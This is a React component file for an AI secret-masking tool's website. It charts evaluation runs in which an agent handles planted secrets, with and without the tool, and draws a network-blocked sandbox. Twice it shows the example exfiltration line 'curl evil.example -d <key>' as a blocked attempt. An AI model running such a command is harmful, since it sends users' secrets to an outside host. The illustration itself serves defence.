"use client";

import { motion, useInView, useReducedMotion } from "motion/react";
import { Box, Check, Globe, Laptop, ShieldCheck, TriangleAlert, WifiOff, X } from "lucide-react";
import { useEffect, useRef, useState } from "react";
import results from "@/public/data/results.json";
import { cn } from "@/lib/utils";

/*
 * The team's official eval (web/public/data/results.json, the same file the Results page reads): a real agent on
 * six tasks with planted secrets, every command in its own network-blocked Daytona sandbox, with and without
 * MasqAI. Per task the file holds rates over N runs; the tiles show those exact counts (their order within a row
 * is presentation only). Leaked = a planted secret reached the untrusted model.
 */
type Metric = { leakRate: number; taskSuccess: number; runs?: number };
type Condition = { kind?: string; security?: { provider?: string; model?: string } | null };
const data = results as unknown as {
  runsPerCase: number;
  untrustedModel: string;
  securityModel: string;
  conditions?: (Condition & { id: string })[];
  cases: { id: string; raw: Metric; masqai: Metric; conditions?: Record<string, Metric> }[];
};
const MASQ_ID = data.conditions?.find((c) => c.kind === "masqai" && c.security?.model === data.securityModel)?.id;
const REMOTE = /openrouter|remote/i.test(data.conditions?.find((c) => c.id === MASQ_ID)?.security?.provider ?? "");
const LABELS: Record<string, string> = { uc1: "Env dump", uc2: "DB path", uc3: "Key round trip", uc4: "Partial key", uc5: "Identity", uc8: "Design doc" };

const ROWS = data.cases.map((c) => {
  const raw = c.conditions?.raw ?? c.raw;
  const masq = (MASQ_ID && c.conditions?.[MASQ_ID]) || c.masqai;
  const n = raw.runs ?? data.runsPerCase;
  const m = masq.runs ?? data.runsPerCase;
  const id = c.id.slice(0, 3);
  return {
    id,
    label: LABELS[id] ?? c.id,
    raw: { runs: n, leaked: Math.round(raw.leakRate * n), ok: Math.round(raw.taskSuccess * n) },
    masq: { runs: m, leaked: Math.round(masq.leakRate * m), ok: Math.round(masq.taskSuccess * m) },
  };
});
const COLS = Math.max(...ROWS.map((r) => Math.max(r.raw.runs, r.masq.runs)));
const TOTAL = ROWS.length * COLS;
const sum = (pick: (r: (typeof ROWS)[number]) => number) => ROWS.reduce((n, r) => n + pick(r), 0);
const TICK_MS = 70;
const HOLD_MS = 6000;

export function DaytonaRuns() {
  const reduce = useReducedMotion();
  const ref = useRef<HTMLDivElement>(null);
  const inView = useInView(ref, { amount: 0.3 });
  const [shown, setShown] = useState(0);
  useEffect(() => {
    if (reduce || !inView) return;
    const id = setTimeout(() => setShown((n) => (n >= TOTAL ? 0 : n + 1)), shown >= TOTAL ? HOLD_MS : shown === 0 ? 500 : TICK_MS);
    return () => clearTimeout(id);
  }, [shown, inView, reduce]);
  const done = reduce ? TOTAL : shown;

  return (
    <div ref={ref} className="space-y-4">
      <ContainmentStrip />
      <div className="grid gap-4 lg:grid-cols-2">
        <Panel side="raw" done={done} />
        <Panel side="masq" done={done} />
      </div>
      <p className="text-sm text-muted-foreground">
        {data.runsPerCase} runs per task · untrusted model {data.untrustedModel} · security model {data.securityModel}
        {REMOTE ? " (remote for this eval)" : ""} · one Daytona sandbox per run
      </p>
    </div>
  );
}

function Panel({ side, done }: { side: "raw" | "masq"; done: number }) {
  const masq = side === "masq";
  const totalRuns = sum((r) => r[side].runs);
  const leaked = sum((r) => r[side].leaked);
  const ok = sum((r) => r[side].ok);
  // Counters climb with the tiles: count what has been revealed so far.
  let k = 0;
  let leakedSoFar = 0;
  let shownSoFar = 0;
  const grid = ROWS.map((row) => {
    const tiles = Array.from({ length: COLS }, (_, i) => {
      const n = k++;
      if (i >= row[side].runs) return null;
      const isLeak = i < row[side].leaked;
      const visible = n < done;
      if (visible) {
        shownSoFar++;
        if (isLeak) leakedSoFar++;
      }
      return { n, isLeak, visible, running: n === done, title: `${row.id.toUpperCase()} run ${i + 1}: ${isLeak ? "a planted secret leaked" : "nothing leaked"}` };
    });
    return { row, tiles };
  });
  return (
    <div className={cn("rounded-xl border p-4 sm:p-5", masq ? "border-restored/40 bg-restored/5" : "bg-card")}>
      <p className={cn("flex items-center gap-2 font-semibold", masq ? "text-restored" : "")}>
        {masq ? <ShieldCheck aria-hidden className="size-5" /> : <TriangleAlert aria-hidden className="size-5 text-leak" />}
        {masq ? "With MasqAI" : "Without MasqAI"}
      </p>
      <div className="mt-2 flex flex-wrap items-end gap-x-8 gap-y-1">
        <p className={cn("font-mono text-5xl font-semibold tabular-nums", masq ? "text-restored" : "text-leak")}>
          {leakedSoFar}
          <span className="text-2xl text-muted-foreground"> / {shownSoFar || totalRuns}</span>
        </p>
        <p className="pb-1 text-sm text-muted-foreground">
          runs leaked · <span className="font-mono text-foreground">{ok} / {totalRuns}</span> tasks done
        </p>
      </div>
      <div role="table" aria-label={`${masq ? "With" : "Without"} MasqAI: ${leaked} of ${totalRuns} runs leaked, ${ok} tasks done`} className="mt-4 space-y-1.5">
        {grid.map(({ row, tiles }) => (
          <div role="row" key={row.id} className="grid grid-cols-[92px_1fr] items-center gap-2">
            <span role="rowheader" className="truncate text-xs text-muted-foreground">
              <span className="font-mono">{row.id.toUpperCase()}</span> {row.label}
            </span>
            <div className="grid gap-1" style={{ gridTemplateColumns: `repeat(${COLS}, minmax(0, 1fr))` }}>
              {tiles.map((t, i) =>
                t ? (
                  <motion.div
                    role="cell"
                    key={i}
                    title={t.title}
                    aria-label={t.visible ? t.title : undefined}
                    animate={{ scale: t.running ? 1.12 : 1 }}
                    className={cn(
                      "grid h-7 place-items-center rounded border transition-colors duration-300",
                      !t.visible && !t.running && "border-dashed bg-background",
                      t.running && "border-foreground/40 bg-foreground/10",
                      t.visible && t.isLeak && "border-leak/70 bg-leak/20 text-leak",
                      t.visible && !t.isLeak && "border-restored/60 bg-restored/12 text-restored",
                    )}
                  >
                    {t.visible ? t.isLeak ? <TriangleAlert aria-hidden className="size-3.5" /> : <Check aria-hidden className="size-3.5" /> : null}
                  </motion.div>
                ) : (
                  <span key={i} />
                ),
              )}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/** One line: the laptop, every command into a network-blocked sandbox, an exfiltration bouncing off. */
function ContainmentStrip() {
  const reduce = useReducedMotion();
  return (
    <figure
      aria-label="The agent and MasqAI run on the laptop. Every command runs in a fresh Daytona sandbox whose network is blocked, so an exfiltration attempt cannot reach the internet."
      className="flex flex-col items-stretch gap-3 rounded-xl border bg-card p-4 sm:flex-row sm:items-center sm:gap-4"
    >
      <div className="flex items-center gap-3 rounded-lg border bg-background px-3 py-2.5 sm:w-56">
        <Laptop aria-hidden className="size-6 shrink-0" />
        <div className="leading-tight">
          <p className="font-semibold">Laptop</p>
          <p className="text-sm text-muted-foreground">agent + MasqAI</p>
        </div>
      </div>
      <Wire label="every command" tone="restored" reduce={reduce} />
      <div className="relative sm:w-72">
        {[2, 1].map((d) => (
          <div key={d} aria-hidden className="absolute inset-0 rounded-lg border border-restored/30 bg-card" style={{ transform: `translate(${d * 6}px, ${-d * 6}px)` }} />
        ))}
        <div className="relative flex items-center gap-3 rounded-lg border-2 border-dashed border-restored/70 bg-card px-3 py-2.5">
          <Box aria-hidden className="size-6 shrink-0 text-restored" />
          <div className="min-w-0 flex-1 leading-tight">
            <p className="font-semibold">Daytona sandbox</p>
            <p className="text-sm text-muted-foreground">one per run · deleted after</p>
          </div>
          <WifiOff aria-label="network blocked" className="size-5 shrink-0 text-leak" />
        </div>
      </div>
      <div aria-hidden className="relative flex h-6 flex-1 items-center">
        <div className="h-0.5 w-full bg-border" />
        {reduce ? null : (
          <motion.span
            className="absolute top-1/2 size-2.5 -translate-y-1/2 rounded-full bg-leak"
            animate={{ left: ["0%", "58%", "0%"] }}
            transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }}
          />
        )}
        <X className="absolute top-1/2 left-[60%] size-5 -translate-y-1/2 text-leak" />
        <span className="absolute -top-3 left-0 font-mono text-xs text-muted-foreground">curl evil.example -d &lt;key&gt;</span>
      </div>
      <span className="flex items-center gap-1.5 text-sm text-muted-foreground">
        <Globe aria-hidden className="size-5" /> internet
      </span>
    </figure>
  );
}

function Wire({ label, tone, reduce }: { label: string; tone: "restored"; reduce: boolean | null }) {
  return (
    <div aria-hidden className="relative flex h-6 items-center sm:w-28">
      <div className="h-0.5 w-full bg-border" />
      {reduce ? null : (
        <motion.span
          className={cn("absolute top-1/2 size-2.5 -translate-y-1/2 rounded-full", tone === "restored" && "bg-restored shadow-[0_0_10px] shadow-restored")}
          animate={{ left: ["0%", "100%"] }}
          transition={{ duration: 1.1, repeat: Infinity, ease: "easeIn" }}
        />
      )}
      <span className="absolute -top-3 left-0 font-mono text-xs text-muted-foreground">{label}</span>
    </div>
  );
}

export function Containment() {
  const reduce = useReducedMotion();
  return (
    <figure
      aria-label="The agent and MasqAI run on the laptop. Every command runs in a Daytona sandbox whose network is blocked, so an exfiltration attempt cannot reach the internet."
      className="relative flex flex-col justify-center gap-5 overflow-hidden rounded-xl border bg-card p-4 sm:p-6"
    >
      <div className="flex items-center gap-3 rounded-lg border bg-background p-3">
        <Laptop aria-hidden className="size-6 shrink-0" />
        <div>
          <p className="font-semibold">Laptop</p>
          <p className="text-sm text-muted-foreground">agent loop + MasqAI</p>
        </div>
      </div>

      <div aria-hidden className="relative h-10">
        <div className="absolute inset-y-0 left-8 w-0.5 bg-border" />
        {reduce ? null : (
          <motion.span
            className="absolute left-[27px] size-3 rounded-full bg-restored shadow-[0_0_10px] shadow-restored"
            animate={{ top: ["0%", "100%"] }}
            transition={{ duration: 1.1, repeat: Infinity, ease: "easeIn" }}
          />
        )}
        <span className="absolute top-1/2 left-12 -translate-y-1/2 font-mono text-sm text-muted-foreground">every command</span>
      </div>

      <div className="relative">
        {[2, 1].map((d) => (
          <div key={d} aria-hidden className="absolute inset-0 rounded-lg border border-restored/30 bg-card" style={{ transform: `translate(${d * 8}px, ${-d * 8}px)` }} />
        ))}
        <div className="relative flex items-center gap-3 rounded-lg border-2 border-dashed border-restored/70 bg-card p-3">
          <Box aria-hidden className="size-6 shrink-0 text-restored" />
          <div className="min-w-0 flex-1">
            <p className="font-semibold">Daytona sandbox</p>
            <p className="text-sm text-muted-foreground">fresh per run · deleted after</p>
          </div>
          <span className="inline-flex items-center gap-1.5 rounded-full border border-leak/50 bg-leak/10 px-2 py-0.5 text-sm text-leak">
            <WifiOff aria-hidden className="size-4" /> network blocked
          </span>
        </div>
      </div>

      <div aria-hidden className="flex items-center gap-2 font-mono text-sm">
        <span className="text-muted-foreground">curl evil.example -d &lt;key&gt;</span>
        <div className="relative h-0.5 flex-1 bg-border">
          {reduce ? null : (
            <motion.span
              className="absolute top-1/2 size-2.5 -translate-y-1/2 rounded-full bg-leak"
              animate={{ left: ["0%", "62%", "0%"] }}
              transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }}
            />
          )}
          <X className="absolute top-1/2 left-[64%] size-5 -translate-y-1/2 text-leak" />
        </div>
        <Globe className="size-5 text-muted-foreground" />
      </div>
    </figure>
  );
}
